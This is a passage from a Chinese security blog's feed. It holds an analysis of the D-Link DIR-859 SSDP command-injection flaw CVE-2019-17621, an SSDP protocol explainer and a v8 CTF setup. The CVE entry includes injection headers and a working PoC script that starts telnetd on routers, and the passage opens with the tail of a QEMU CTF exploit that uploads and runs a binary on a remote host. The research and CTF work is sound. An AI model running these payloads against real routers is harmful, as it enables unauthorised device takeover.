./exp'</span>)</span><br><span class="line">    os.system(<span class="string">'gzip -c ./exp &gt; ./exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'cat &lt;&lt;EOF &gt; exp.gz.b64'</span>)</span><br><span class="line">    r.sendline((read(<span class="string">'./exp.gz'</span>)).encode(<span class="string">'base64'</span>))</span><br><span class="line">    r.sendline(<span class="string">'EOF'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'base64 -d exp.gz.b64 &gt; exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'gunzip ./exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'chmod +x ./exp'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'./exp'</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./startvm.sh', shell=True)</span></span><br><span class="line">p = remote(<span class="string">'106.14.216.214'</span>,<span class="number">50273</span>)</span><br><span class="line"></span><br><span class="line">exploit(p)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。目前qemu出问题比较多的地方以及比赛中出题目的形式都在在设备模拟中。&lt;/p&gt;
&lt;p&gt;所以其实这种题型一般就是关注它描述设备自定义的那个设备结构体还有与这个设备通信的相关函数。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="wood1314.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="qemu" scheme="wood1314.github.io/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>D-Link DIR-859 及其系列上存在的ssdpcgi未认证命令执行漏洞(CVE-2019–17621)</title>
    <link href="wood1314.github.io/year/02/05/ckur473d7000aab15uziwkiai/"/>
    <id>wood1314.github.io/year/02/05/ckur473d7000aab15uziwkiai/</id>
    <published>2021-02-05T01:51:07.000Z</published>
    <updated>2021-02-05T01:59:44.787Z</updated>
    
    <content type="html"><![CDATA[<p>最近打算针对一个类型的漏洞进行仔细的分析，希望能通过这个漏洞的分析总结归纳出具有这个漏洞的设备的特点，利于指导之后的漏洞挖掘。<br>目前的分析思路：<br>    1. 首先分析该漏洞在DIR-859上的形成原因，利用思路。<br>        2. 查看其他受影响的设备漏洞形成原因和利用方式与该DIR-859上有何不同<br>        3. 研究官方补丁，看看官方如何修补该漏洞<br>        4. 研究除了DLINk系列，其他系列的设备处理SSDP的流程是否也存在类似问题</p><a id="more"></a><h3 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h3><p>主要是在ssdpcgi函数中发现了该漏洞，且因为SSDP协议缘故，该漏洞利用无须通过认证<br>漏洞起因主要是因为环境变量没有进行字符过滤</p><ol><li><p>漏洞研究版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">型号：DIR-859</span><br><span class="line">固件版本：1.06b01 Beta01，1.05</span><br><span class="line">架构：MIPS 32位</span><br></pre></td></tr></table></figure></li><li><p>目前搜集到的受影响的Dlink版本<br><img src="/05/ckur473d7000aab15uziwkiai/1.png" alt></p><h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>首先分析一下这个ssdpcgi函数的逻辑<br>首先是a1,也就是参数个数。随后获取了四个环境变量<br><img src="/05/ckur473d7000aab15uziwkiai/2.png" alt="ccad2c09a97638c032bb6c7814e2e0b7.png"><br>HTTP_ST这个字段主要是关系到搜索的方式，根据函数逻辑一共有4种发现设备的方式</p></li><li><p>ssdp:all 搜索所有的UPnP设备以及服务</p></li><li><p>upnp:rootdevice：搜索root设备</p></li><li><p>uuid: 查询特定uuid的设备</p></li><li><p>urn: 查询指定类型的设备</p></li></ol><p>以下是四种情况的处理流程，可以看到最终都会执行lxmldbc_system这个函数来执行M-SEARCH.sh这个脚本来查询设备<br>最后执行的命令基本格式就是两种，xxxx就是可以注入的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/scripts/upnp/M-SEARCH.sh ssdpall adddr:port id &amp;</span><br><span class="line">/etc/scripts/upnp/M-SEARCH.sh uuid adddr:port id uuid:xxxxxx&amp;</span><br></pre></td></tr></table></figure><p>所以只要将ST字段设置为uuid或者urn就可以在最后拼接自己构造的ST<br>还有就是其他人的poc都是说只能用urn：构造后利用。但我觉得uuid也是可以的。<br><img src="/05/ckur473d7000aab15uziwkiai/3.png" alt="60f9b44fd4272eb6602119af5b24ab1f.png"><br>现在我先把路由器模拟起来试一下，使用firmadyne进行模拟<br><img src="/05/ckur473d7000aab15uziwkiai/4.png" alt="06cb32a32c2c76412b8c845ada7fecb9.png"><br>尝试如此构造header注入，成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] Preparando Header ...</span><br><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST:192.168.0.1:1900</span><br><span class="line">ST:urn::device:1;telnetd</span><br><span class="line">MX:2</span><br><span class="line">MAN:&quot;ssdp:discover&quot;</span><br></pre></td></tr></table></figure><p>果然uuid也可以，header的ST部分也可以如此构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header += &quot;ST:uuid:1;telnetd\n&quot;</span><br></pre></td></tr></table></figure><p><img src="/05/ckur473d7000aab15uziwkiai/5.png" alt="928033f201fa083f28dc313c4df4743e.png"></p><h4 id="测试使用的反向连接poc脚本"><a href="#测试使用的反向连接poc脚本" class="headerlink" title="测试使用的反向连接poc脚本"></a>测试使用的反向连接poc脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="comment"># Exploit By Miguel Mendez - @s1kr10s</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">config_payload</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    header = <span class="string">"M-SEARCH * HTTP/1.1\n"</span></span><br><span class="line">    header += <span class="string">"HOST:"</span>+str(ip)+<span class="string">":"</span>+str(port)+<span class="string">"\n"</span></span><br><span class="line">    header += <span class="string">"ST:urn::device:1;telnetd\n"</span></span><br><span class="line">    <span class="comment"># header += "ST:uuid:1;telnetd\n"</span></span><br><span class="line">    header += <span class="string">"MX:2\n"</span></span><br><span class="line">    header += <span class="string">'MAN:"ssdp:discover"'</span>+<span class="string">"\n\n"</span></span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_conexion</span><span class="params">(ip, port, payload)</span>:</span></span><br><span class="line">    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)</span><br><span class="line">    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,<span class="number">2</span>)</span><br><span class="line">    sock.sendto(payload,(ip, port))</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</span><br><span class="line">    ip = raw_input(<span class="string">"Router IP: "</span>)</span><br><span class="line">    port = <span class="number">1900</span></span><br><span class="line">    headers = config_payload(ip, port)</span><br><span class="line">    print(<span class="string">"\n---= HEADER =---\n"</span>)</span><br><span class="line">    print(<span class="string">"[+] Preparando Header ..."</span>)</span><br><span class="line">    <span class="keyword">print</span> headers</span><br><span class="line">    print(<span class="string">"[+] Enviando payload ..."</span>)</span><br><span class="line">    print(<span class="string">"[+] Activando servicio telnetd :)"</span>) </span><br><span class="line">    send_conexion(ip, port, headers)</span><br><span class="line">    print(<span class="string">"[+] Conectando al servicio ...n"</span>)</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    os.system(<span class="string">'telnet '</span> + str(ip))</span><br></pre></td></tr></table></figure><h3 id="0x03-针对DIR859上漏洞的总结"><a href="#0x03-针对DIR859上漏洞的总结" class="headerlink" title="0x03 针对DIR859上漏洞的总结"></a>0x03 针对DIR859上漏洞的总结</h3><p>经过分析我觉得造成这个UPnp漏洞的原因主要有以下两点</p><ol><li><strong>环境变量并未进行字符过滤</strong></li><li>利用SSDP进行查询时，发现根设备和遍历设备两种模式都不需要额外参数，因此不会造成命令执行注入。<strong>但是针对于特定类型设备的查询时比如利用uuid和urn来指定时</strong>，指定的信息会成为system命令执行参数的一部分，而这部分就可以造成命令执行注入了。而且包括REMOTE_ADDR和REMOTE_PORT是都没有对其进行过滤，因此这两个是也可以注入的</li></ol><h3 id="0x04-其他DLink路由器上的ssdpcgi行为分析"><a href="#0x04-其他DLink路由器上的ssdpcgi行为分析" class="headerlink" title="0x04 其他DLink路由器上的ssdpcgi行为分析"></a>0x04 其他DLink路由器上的ssdpcgi行为分析</h3><h4 id="1-DIR885L"><a href="#1-DIR885L" class="headerlink" title="1 DIR885L"></a>1 DIR885L</h4><p>DIR885LA (1.20b02) 是已经经过了修补的</p><p>首先一样的是获取四个环境变量的操作，但是sub_17788对ST进行了一些操作</p><p><img src="/05/ckur473d7000aab15uziwkiai/6.png" alt="df7e2fc7cbcc5bdeb5348c5b0c8390c0.png"></p><p>让我们跟进sub_17788看看其做了什么操作，发现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_17788</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="keyword">sizeof</span>(v13));</span><br><span class="line">  <span class="comment">//首先看首部是不是uuid</span></span><br><span class="line">  result = <span class="built_in">strncmp</span>(a1, <span class="string">"uuid:"</span>, <span class="number">5u</span>);</span><br><span class="line">  <span class="comment">//如果不是uuid，那么就应该是urn来指定设备</span></span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//每次循环将urn指定的设备格式和它硬编码在程序里的一个字典循环比较，如果字典比较完了还没有匹配就直接置0退出</span></span><br><span class="line">      <span class="keyword">if</span> ( !off_30354[v14] )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_30350 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="built_in">strcmp</span>(off_30354[v14], a1);</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果匹配到了相应字典就把该设备名称输入到变量里</span></span><br><span class="line">    result = <span class="built_in">snprintf</span>(byte_3051C, <span class="number">0x400</span>u, <span class="string">"%s"</span>, off_30354[v14]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果是uuid就利用格式化字符串转化成uuid的格式</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(v13, <span class="number">0x400</span>u, <span class="string">"%s"</span>, a1 + <span class="number">5</span>);</span><br><span class="line">    v2 = strtok(v13, <span class="string">"-"</span>);</span><br><span class="line">    v3 = strtol(v2, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v4 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v5 = strtol(v4, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v6 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v7 = strtol(v6, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v8 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v9 = strtol(v8, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    v10 = strtok(<span class="number">0</span>, <span class="string">"-"</span>);</span><br><span class="line">    v11 = strtoll(v10, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    result = <span class="built_in">snprintf</span>(byte_3051C, <span class="number">0x400</span>u, <span class="string">"uuid:%08X-%04X-%04X-%04X-%012llX"</span>, v3, v5, v7, v9, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-DIR-865L"><a href="#2-DIR-865L" class="headerlink" title="2 DIR-865L"></a>2 DIR-865L</h4><p>版本1.07b01<br>漏洞与DIR-859基本没有区别，漏洞点与漏洞代码完全一致</p><h3 id="0x05-其他厂商路由器对SSDP的实现"><a href="#0x05-其他厂商路由器对SSDP的实现" class="headerlink" title="0x05 其他厂商路由器对SSDP的实现"></a>0x05 其他厂商路由器对SSDP的实现</h3><h4 id="1-ASUS-WRT-AC66U"><a href="#1-ASUS-WRT-AC66U" class="headerlink" title="1 ASUS WRT-AC66U"></a>1 ASUS WRT-AC66U</h4><p>利用下面这个命令找到usr/sbin/miniupnpd，这个二进制文件应该是提供SSDP服务的<br>看名称感觉华硕使用的是开源的miniupnp模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rnl &quot;upnp&quot;</span><br></pre></td></tr></table></figure><p>接着逆向分析固件，搜索ssdp相关函数（也可以搜索ST字符串）找到对应的逻辑</p><p>同样关注点在选择特定参数或者uuid的查询上，核心逻辑就是下面这个图</p><p>可以看到他每次查询都是从一个已经查询好的列表里不停匹配（rootDevice)，匹配成功了就返回成功的结果，不存在用户输入被执行了的结果<br><img src="/05/ckur473d7000aab15uziwkiai/7.png" alt="9742c40625a584096abbe1d839ba3deb.png"> </p><h4 id="2-FAST-FER-450"><a href="#2-FAST-FER-450" class="headerlink" title="2 FAST-FER 450"></a>2 FAST-FER 450</h4><p>与AC66U一样，同样使用miniupnpd，代码基本一致</p><h4 id="3-网剑R6700"><a href="#3-网剑R6700" class="headerlink" title="3 网剑R6700"></a>3 网剑R6700</h4><p>自己实现的一个过程，完整过程还需研究</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>CVE-2019–17621: D-Link DIR-859 未授权命令执行漏洞分析 - 安全客，安全资讯平台 (anquanke.com)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近打算针对一个类型的漏洞进行仔细的分析，希望能通过这个漏洞的分析总结归纳出具有这个漏洞的设备的特点，利于指导之后的漏洞挖掘。&lt;br&gt;目前的分析思路：&lt;br&gt;    1. 首先分析该漏洞在DIR-859上的形成原因，利用思路。&lt;br&gt;        2. 查看其他受影响的设备漏洞形成原因和利用方式与该DIR-859上有何不同&lt;br&gt;        3. 研究官方补丁，看看官方如何修补该漏洞&lt;br&gt;        4. 研究除了DLINk系列，其他系列的设备处理SSDP的流程是否也存在类似问题&lt;/p&gt;
    
    </summary>
    
      <category term="IOT" scheme="wood1314.github.io/categories/IOT/"/>
    
    
      <category term="IOT" scheme="wood1314.github.io/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>SSDP协议</title>
    <link href="wood1314.github.io/year/02/05/ckur473ds0014ab157lm11uj1/"/>
    <id>wood1314.github.io/year/02/05/ckur473ds0014ab157lm11uj1/</id>
    <published>2021-02-05T01:21:28.000Z</published>
    <updated>2021-02-05T01:49:19.098Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSDP协议"><a href="#SSDP协议" class="headerlink" title="SSDP协议"></a>SSDP协议</h2><h3 id="0x01何为SSDP"><a href="#0x01何为SSDP" class="headerlink" title="0x01何为SSDP"></a>0x01何为SSDP</h3><p>SSDP 使用一个固定的组播地址 239.255.255.250 和 UDP 端口号 1900 来监听其他设备的请求。SSDP 协议的请求消息有两种类型，第一种是服务通知，设备和服务使用此类通知消息声明自己存在；第二种是查询请求，协议客户端用此请求查询某种类型的设备和服务。</p><a id="more"></a><p>“为了能被网络搜索发现，目标设备应该向发起多播请求的源IP地址及端口发送单播UDP响应。如果M-SEARCH请求报文的ST头部字段以“ssdp:all”、“upnp:rootdevice”或者“uuid:”开头，后面跟着与设备相匹配的UUID信息，或者如果M-SERCH请求与设备支持的设备类型或服务类型相匹配，那么该设备就会应答M-SEARCH请求报文”。这种策略在实际环境中能够正常工作。例如，我的Chrome浏览器经常会请求搜索智能电视：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tcpdump -ni eth0 udp and port 1900 -A IP 192.168.1.124.53044 &gt; 239.255.255.250.1900: UDP, length 175   </span><br><span class="line">M-SEARCH * HTTP/1.1   </span><br><span class="line">HOST: 239.255.255.250:1900   </span><br><span class="line">MAN: &quot;ssdp:discover&quot;   </span><br><span class="line">MX: 1   </span><br><span class="line">ST: urn:dial-multiscreen-org:service:dial:1   </span><br><span class="line">USER-AGENT: Google Chrome/58.0.3029.110 Windows</span><br></pre></td></tr></table></figure><p>这个报文被发往一个多播IP地址。监听这一地址的其他设备如果与报文头部中指定的ST（search-target，搜索目标）多屏幕类型设备相匹配，那么这些设备应该会响应这个请求报文。除了请求具体的设备类型，请求报文中还可以包含两类“通用的”ST查询类型：<br>1、upnp:rootdevice：搜索root设备<br>2、ssdp:all：搜索所有的UPnP设备以及服务你可以运行以下python脚本（在另一脚本的基础上修改而得），使用前面提到的这些ST查询类型来枚举网络中的设备列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python2 </span></span><br><span class="line"><span class="keyword">import</span> socket   </span><br><span class="line"><span class="keyword">import</span> sys dst = <span class="string">"239.255.255.250"</span>   </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:       </span><br><span class="line">    dst = sys.argv[<span class="number">1</span>] </span><br><span class="line">st = <span class="string">"upnp:rootdevice"</span>   </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">2</span>:      </span><br><span class="line">    st = sys.argv[<span class="number">2</span>] </span><br><span class="line">msg = [       </span><br><span class="line">    <span class="string">'M-SEARCH * HTTP/1.1'</span>,   </span><br><span class="line">    <span class="string">'Host:239.255.255.250:1900'</span>,     </span><br><span class="line">    <span class="string">'ST:%s'</span> % (st,),    </span><br><span class="line">    <span class="string">'Man:"ssdp:discover"'</span>,     </span><br><span class="line">    <span class="string">'MX:1'</span>,     <span class="string">''</span>] s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)  </span><br><span class="line">s.settimeout(<span class="number">10</span>)  </span><br><span class="line">s.sendto(<span class="string">'rn'</span>.join(msg), (dst, <span class="number">1900</span>) ) </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:       </span><br><span class="line">    <span class="keyword">try</span>:         </span><br><span class="line">        data, addr = s.recvfrom(<span class="number">32</span>*<span class="number">1024</span>)    </span><br><span class="line">    <span class="keyword">except</span> socket.timeout:        </span><br><span class="line">        <span class="keyword">break</span>     </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] %sn%s"</span> % (addr, data)</span><br></pre></td></tr></table></figure><h3 id="0x02设备查询"><a href="#0x02设备查询" class="headerlink" title="0x02设备查询"></a>0x02设备查询</h3><p>当一个客户端接入网络的时候，它可以向一个特定的多播地址的 SSDP 端口使用 M-SEARCH 方法发送 “ssdp:discover” 消息。当设备监听到这个保留的多播地址上由控制点发送的消息的时候，设备将通过单播的方式直接响应控制点的请求。</p><p>典型的设备查询请求消息格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">S:uuid:ijklmnop-7dec-11d0-a765-00a0c91e6bf6</span><br><span class="line">Host:239.255.255.250:1900</span><br><span class="line">Man:&quot;ssdp:discover&quot;ST:ge:fridge</span><br><span class="line">MX:3</span><br></pre></td></tr></table></figure><h4 id="响应消息"><a href="#响应消息" class="headerlink" title="响应消息"></a>响应消息</h4><p>响应消息应该包含服务的位置信息（Location 或AL头），ST和USN头。响应消息应该包含cache控制信息（max-age 或者 Expires头）。</p><p>典型的响应消息格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Cache-Control: max-age= seconds until advertisement expires</span><br><span class="line">S: uuid:ijklmnop-7dec-11d0-a765-00a0c91e6bf6</span><br><span class="line">Location: URL for UPnP description for root device</span><br><span class="line">Cache-Control: no-cache=&quot;Ext&quot;,max-age=5000ST:ge:fridge // search targetUSN: uuid:abcdefgh-7dec-11d0-a765-00a0c91e6bf6</span><br></pre></td></tr></table></figure><h3 id="设备通知消息"><a href="#设备通知消息" class="headerlink" title="设备通知消息"></a>设备通知消息</h3><p>在设备加入网络时，它应当向一个特定的多播地址的 SSDP 端口使用 NOTIFY 方法发送 “ssdp:alive” 消息，以便宣布自己的存在，更新期限信息，更新位置信息。</p><h4 id="1-ssdp-alive-消息"><a href="#1-ssdp-alive-消息" class="headerlink" title="1 ssdp:alive 消息"></a>1 ssdp:alive 消息</h4><p>由于 UDP 协议是不可信的，设备应该定期发送它的公告消息。在设备加入网络时，它必须用 NOTIFY 方法发送一个多播传送请求。NOTIFY 方法发送的请求没有回应消息。</p><p>典型的设备通知消息格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">NOTIFY * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">CACHE-CONTROL: max-age = seconds until advertisement expires</span><br><span class="line">LOCATION: URL for UPnP description for root deviceNT: search target</span><br><span class="line">NTS: ssdp:alive</span><br><span class="line">USN: advertisement UUID</span><br></pre></td></tr></table></figure><h4 id="2-ssdp-byebye消息"><a href="#2-ssdp-byebye消息" class="headerlink" title="2 ssdp:byebye消息"></a>2 ssdp:byebye消息</h4><p>当一个设备计划从网络上卸载的时候，它也应当向一个特定的多播地址的 SSDP 端口使用 NOTIFY 方法发送 “ssdp:byebye” 消息。但是，即使没有发送 “ssdp:byebye” 消息，控制点也会根据 “ssdp:alive” 消息指定的超时值，将超时并且没有再次收到的 “ssdp:alive” 消息对应的设备认为是失效的设备。</p><p>典型的设备卸载消息格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NOTIFY * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900NT: search target</span><br><span class="line">NTS: ssdp:byebye</span><br><span class="line">USN: advertisement UUID</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>P2P 网络核心技术：UPnP 和 SSDP 协议 - 知乎 (zhihu.com)</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SSDP协议&quot;&gt;&lt;a href=&quot;#SSDP协议&quot; class=&quot;headerlink&quot; title=&quot;SSDP协议&quot;&gt;&lt;/a&gt;SSDP协议&lt;/h2&gt;&lt;h3 id=&quot;0x01何为SSDP&quot;&gt;&lt;a href=&quot;#0x01何为SSDP&quot; class=&quot;headerlink&quot; title=&quot;0x01何为SSDP&quot;&gt;&lt;/a&gt;0x01何为SSDP&lt;/h3&gt;&lt;p&gt;SSDP 使用一个固定的组播地址 239.255.255.250 和 UDP 端口号 1900 来监听其他设备的请求。SSDP 协议的请求消息有两种类型，第一种是服务通知，设备和服务使用此类通知消息声明自己存在；第二种是查询请求，协议客户端用此请求查询某种类型的设备和服务。&lt;/p&gt;
    
    </summary>
    
      <category term="IOT" scheme="wood1314.github.io/categories/IOT/"/>
    
    
      <category term="IOT" scheme="wood1314.github.io/tags/IOT/"/>
    
      <category term="SSDP" scheme="wood1314.github.io/tags/SSDP/"/>
    
  </entry>
  
  <entry>
    <title>v8-startctf2019-oob</title>
    <link href="wood1314.github.io/year/11/12/ckur473ep003yab15i3kjhswr/"/>
    <id>wood1314.github.io/year/11/12/ckur473ep003yab15i3kjhswr/</id>
    <published>2020-11-12T06:24:00.000Z</published>
    <updated>2020-12-03T14:20:24.297Z</updated>
    
    <content type="html"><![CDATA[<p>一道简单v8例题来看下v8的利用</p><a id="more"></a><h2 id="0x01-题目准备"><a href="#0x01-题目准备" class="headerlink" title="0x01 题目准备"></a>0x01 题目准备</h2><p>先恢复到指定版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gclient sync</span><br><span class="line">git apply &lt; ../browser_pwn/Chrome/oob.diff</span><br><span class="line">tools/dev/v8gen.py x64.release</span><br></pre></td></tr></table></figure><p>修改文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim out.gn/x64.release/args.gn</span><br></pre></td></tr></table></figure><p>添加内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v8_enable_backtrace = true</span><br><span class="line">v8_enable_disassembler = true</span><br><span class="line">v8_enable_object_print = true</span><br><span class="line">v8_enable_verify_heap = true</span><br></pre></td></tr></table></figure><p>最后编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ninja -C out.gn/x64.release d8</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一道简单v8例题来看下v8的利用&lt;/p&gt;
    
    </summary>
    
      <category term="v8pwn" scheme="wood1314.github.io/categories/v8pwn/"/>
    
    
      <category term="v8" scheme="wood1314.github.io/tags/v8/"/>
    
  </entry>
  
  <entry>
